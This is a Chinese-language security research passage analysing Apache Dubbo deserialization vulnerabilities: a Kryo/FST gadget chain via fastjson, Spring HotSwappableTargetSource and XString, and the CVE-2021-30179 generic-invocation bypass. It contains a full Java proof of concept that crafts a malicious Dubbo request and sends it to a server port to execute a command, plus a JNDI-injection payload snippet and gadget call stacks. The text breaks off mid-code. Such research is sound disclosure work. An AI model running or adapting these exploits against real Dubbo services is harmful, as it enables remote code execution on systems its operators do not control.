dubbo中存在
dubbo-common中又存在fastjson
所以利用链就比较清楚了，结合之前分析的hessian的老五条
使用`org.springframework.aop.target.HotSwappableTargetSource#equals ->
com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)->
xxxx.toString()`
fastjson中 `JSONObject`
是可以被序列化的，当其显式或隐式被调用`toString`方法时，会触发绑定对象的getter方法，这算是人尽皆知的事实。
所以结合上面的poc改改就可以了，
    package org.apache.dubbo.samples.basic;
    import com.alibaba.fastjson.JSONObject;
    import org.apache.dubbo.common.io.Bytes;
    import org.apache.dubbo.common.serialize.ObjectOutput;
    import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
    import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;
    import org.apache.dubbo.rpc.RpcInvocation;
    import java.io.ByteArrayOutputStream;
    import java.io.OutputStream;
    import java.lang.reflect.Method;
    import java.net.Socket;
    import java.util.HashMap;
    import java.util.Random;
    public class FSTTest {
        public static String SerType = "FST";
        public static Object getGadgetsObj(String cmd) throws Exception{
            //Make TemplatesImpl
            Object templates = Utils.createTemplatesImpl(cmd);
            //Make FastJson Gadgets Chain
            JSONObject jo = new JSONObject();
            jo.put("oops",templates);
            return Utils.makeXStringToStringTrigger(jo);
        }
        public static void main(String[] args) throws Exception {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            //Make header
            byte[] header = new byte[16];
            ObjectOutput objectOutput;
            // set magic number.
            Bytes.short2bytes((short) 0xdabb, header);
            // set request and serialization flag.
            switch (SerType) {
                case "FST":
                    objectOutput = new FstObjectOutput(baos);
                    header[2] = (byte) ((byte) 0x80 | (byte)9 | (byte) 0x40);
                    break;
                case "Kyro":
                default:
                    objectOutput = new KryoObjectOutput(baos);
                    header[2] = (byte) ((byte) 0x80 | (byte)8 | (byte) 0x40);
                    break;
            }
            // set request id.
            Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
            //Genaral ObjectOutput
            objectOutput.writeUTF("2.0.2");
            objectOutput.writeUTF("org.apache.dubbo.samples.basic.api.DemoService");
            objectOutput.writeUTF("0.0.0");
            objectOutput.writeUTF("sayHello");
            objectOutput.writeUTF("Ljava/lang/String;"); //*/
            objectOutput.writeObject(getGadgetsObj("calc"));
            objectOutput.writeObject(null);
            objectOutput.flushBuffer();
            //Transform ObjectOutput to bytes payload
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bytes.int2bytes(baos.size(), header, 12);
            byteArrayOutputStream.write(header);
            byteArrayOutputStream.write(baos.toByteArray());
            byte[] bytes = byteArrayOutputStream.toByteArray();
            //Send Payload
            Socket socket = new Socket("192.168.0.103", 20880);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();
        }
    }
Utils，借鉴`ysoserial.payloads.util.Gadgets`
再自行添加一个方法就行
    public static Object makeXStringToStringTrigger(Object o) throws Exception {
            XString x = new XString("HEYO");
            return Utils.makeMap(new HotSwappableTargetSource(o), new HotSwappableTargetSource(x));
        }
调用链如下，
FST，
    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
    write:270, MapSerializer (com.alibaba.fastjson.serializer)
    write:44, MapSerializer (com.alibaba.fastjson.serializer)
    write:280, JSONSerializer (com.alibaba.fastjson.serializer)
    toJSONString:863, JSON (com.alibaba.fastjson)
    toString:857, JSON (com.alibaba.fastjson)
    equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    equals:104, HotSwappableTargetSource (org.springframework.aop.target)
    putVal:635, HashMap (java.util)
    put:612, HashMap (java.util)
    instantiate:79, FSTMapSerializer (org.nustaq.serialization.serializers)
    instantiateAndReadWithSer:497, FSTObjectInput (org.nustaq.serialization)
    readObjectWithHeader:366, FSTObjectInput (org.nustaq.serialization)
    readObjectInternal:327, FSTObjectInput (org.nustaq.serialization)
    readObject:307, FSTObjectInput (org.nustaq.serialization)
    readObject:102, FstObjectInput (org.apache.dubbo.common.serialize.fst)
    decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
Kryo
    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
    write:270, MapSerializer (com.alibaba.fastjson.serializer)
    write:44, MapSerializer (com.alibaba.fastjson.serializer)
    write:280, JSONSerializer (com.alibaba.fastjson.serializer)
    toJSONString:863, JSON (com.alibaba.fastjson)
    toString:857, JSON (com.alibaba.fastjson)
    equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    equals:104, HotSwappableTargetSource (org.springframework.aop.target)
    putVal:635, HashMap (java.util)
    put:612, HashMap (java.util)
    read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
    read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
    readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
    readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
    readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
    decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
具体细节自行调试。
### 补丁分析
dubbo-common 2.7.3 的版本中存在kryo 和 fst 的序列化需要的类，
而在 dubbo-common 2.7.4.1 中，这三个包并不存在，
需要自行导入，
但是我发现，并不是dubbo版本 2.7.9以下才会出现漏洞，我在测试了 dubbo 和dubbo-common 2.7.9 2.7.10
漏洞仍然可以触发，
而且也不会被`CVE-2020-1948的补丁过滤拦截` ，fastjson 版本也还保持在1.2.46，利用链可以触发。
所以关键因素我觉得仍然是服务端是否允许 kyro 和 fst 这两种序列化方式。
## CVE-2021-30179
### 简述
其中的`issue 4`就简单介绍了此漏洞原理，
`dubbo`默认支持泛型调用（
绕过的原因。通过泛型调用`provider`暴露的接口的时候会使用`GenericFilter`来处理，`RPC attachment`
需要指定调用是一个泛型调用，同时可以提供反序列化方式，
### 影响版本
    Apache Dubbo 2.7.0 to 2.7.9
    Apache Dubbo 2.6.0 to 2.6.9
    Apache Dubbo all 2.5.x versions (官方已不再提供支持)
，然后通过Java反射完成最后调用。
    org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)
在这里解码的时候
通过读取 attachment，其实这个attachment就是一个map，最后writeObject 进去的，
然后将其和`attachments` 属性合并，
泛型调用最后会使用，`org.apache.dubbo.rpc.filter.GenericFilter#invoke`来处理，
这里获取generic，作为反序列化方式的一种判断，
这里提出了三种利用方式，
### raw.return
跟进一下，参数 args通过下面的代码来反序列化获取
    args = PojoUtils.*realize*(args, params, method.getGenericParameterTypes());
但其实传入的待处理的 args 是我们一开始写入的参数对象，
    // 泛型调用第一个参数  方法名
            out.writeUTF("sayHello");
            // 泛型调用第二个参数  参数类型数组
            out.writeObject(new String[] {"java.lang.String"});
            // 泛型调用第三个参数  参数对象
            HashMap jndi = new HashMap();
            jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
            jndi.put("asText", JNDI_URL);
            out.writeObject(new Object[]{jndi});
            // attachment
            HashMap map = new HashMap();
            map.put("generic", "raw.return");
            out.writeObject(map);
POJO 实际上就是一个普通的Java对象，没有实现任何接口和继承，就是单纯单纯单纯，不能用序列化等方式还原，就用到了一些特殊的处理。
    org.apache.dubbo.common.utils.PojoUtils#realize0
跟进，这里的 pojo 就是 上次待处理的 args，也就是参数对象。
如果pojo是个map，
就从里面获取"class" 对应的类名，加载进来，如果不是 Map 向下的类型，或者Object，且不是接口，就会实例化，
然后遍历 pojo，通过key来获取加载进来的类的 setter方法和属性，
如果方法存在，那么就对value递归处理，最后反射调用对应的setter方法，
这个过程可以想象成 fastjson
的编组时的行为，作者使用的是`org.apache.xbean.propertyeditor.JndiConverter#setAsText`
用一个 `LinkedHashMap` 就可以通过`com.sun.rowset.JdbcRowSetImpl#setAutoCommit`
来JNDI了，无需加入依赖。
调用栈
    connect:634, JdbcRowSetImpl (com.sun.rowset)
    setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    realize0:483, PojoUtils (org.apache.dubbo.common.utils)
    realize:211, PojoUtils (org.apache.dubbo.common.utils)
    realize:99, PojoUtils (org.apache.dubbo.common.utils)
    invoke:91, GenericFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol) [3]
    invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol) [2]
    invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol) [1]
    reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
    received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
    received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
    received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
    run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
### bean
观察一下 bean处理的方式，
需要是一个`JavaBeanDescriptor` 的实例，
`org.apache.dubbo.common.beanutil.JavaBeanDescriptor` 这是个什么东西，就是个JavaBean的封装器，
主要有三个属性
classname 表示需要被描述的JavaBean 的类名，type指定描述器的类型，
`org.apache.dubbo.common.beanutil.JavaBeanSerializeUtil` 反序列化器会根据这些类型进行不同的处理。
`properties` 本身就是一个有序哈希表，存入属性名和对应的属性值。
继续跟进
    org.apache.dubbo.common.beanutil.JavaBeanSerializeUtil#instantiateForDeserialize
通过构造`JavaBeanDescriptor`时的`type`，
来选择如何根据`classname`还原一个类，具体细节可以看代码，
核心是`org.apache.dubbo.common.beanutil.JavaBeanSerializeUtil#deserializeInternal`
类，
下面这个else 分支代表的是BeanType的处理，
    }else {
                    if (!beanDescriptor.isBeanType()) {
                        throw new IllegalArgumentException("Unsupported type " + beanDescriptor.getClassName() + ":" + beanDescriptor.getType());
                    }
                    Iterator var15 = beanDescriptor.iterator();